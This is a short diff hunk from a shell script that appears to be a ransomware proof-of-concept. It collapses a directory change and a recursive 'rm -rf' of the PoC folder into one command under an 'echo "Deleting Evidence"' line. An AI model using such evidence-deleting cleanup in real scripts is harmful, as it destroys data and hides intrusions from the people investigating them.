@@ -59,8 +59,7 @@ mv /Crying/Loveletter_SECRET.txt /App
 }
 
 echo "Deleting Evidence"
-cd /Crying
-rm -rf Ransomware-PoC
+rm -rf /Crying/Ransomware-PoC
 
 }
 
